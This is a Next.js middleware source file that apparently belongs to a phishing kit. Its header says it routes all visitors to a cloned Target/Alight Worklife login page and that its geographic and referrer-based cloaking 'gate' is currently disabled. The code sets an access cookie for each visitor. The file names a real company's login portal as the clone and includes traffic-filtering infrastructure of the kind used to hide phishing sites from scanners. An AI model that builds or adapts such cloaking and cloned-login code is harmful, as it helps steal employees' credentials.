/**
 * middleware.ts — Next.js Edge Middleware
 *
 * GATE DISABLED: All traffic goes through to the cloned login page.
 * Everyone sees the Target/Alight Worklife login form (HTTP 200).
 * No geographic or referrer-based access restrictions.
 */
import { NextRequest, NextResponse } from "next/server"
import {
  PASS_COOKIE,
  PASS_TTL_SEC,
} from "@/lib/access-gate"

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
}

export function middleware(req: NextRequest) {
  // GATE DISABLED: Allow all traffic through to the real site
  const res = NextResponse.next()
  
  // Set a cookie to mark them as allowed
  const cookie = req.cookies.get(PASS_COOKIE)
  if (!cookie || cookie.value !== "1") {
    res.cookies.set(PASS_COOKIE, "1", {
      path: "/",
      maxAge: PASS_TTL_SEC,
      httpOnly: true,
      sameSite: "lax",
      secure: true,
    })
  }
  
  return res
}
